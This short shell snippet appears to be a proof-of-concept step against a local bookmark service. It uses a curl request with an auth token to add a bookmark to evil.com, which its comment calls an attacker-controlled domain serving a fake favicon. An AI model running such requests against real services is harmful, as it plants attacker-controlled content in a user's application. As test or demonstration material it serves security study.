
# Adds a bookmark to an attacker-controlled domain serving a fake favicon

AUTH=123456
curl "http://localhost:8888/$AUTH/add/url/http%3A%2F%2Fevil.com"
